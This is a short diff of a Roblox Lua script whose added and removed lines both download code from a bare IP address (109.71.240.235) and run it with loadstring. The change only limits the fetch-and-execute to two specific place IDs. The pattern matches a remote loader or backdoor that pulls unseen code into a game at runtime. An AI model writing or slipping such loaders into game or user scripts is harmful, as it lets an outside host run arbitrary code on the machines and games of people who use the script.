@@ -1,6 +1,8 @@
-ID="8899cc7c-9132-4b96-b903-a3f925fae39f";
-local HttpService = game:GetService("HttpService")
-local code = HttpService:GetAsync("http://109.71.240.235:3910/cdn/loader.luau")
+if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 and RUN_AFTER then
+    task.spawn(RUN_AFTER)
+end
 
-local func = loadstring(code)
-pcall(func)
+if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+    ID="8899cc7c-9132-4b96-b903-a3f925fae39f";
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
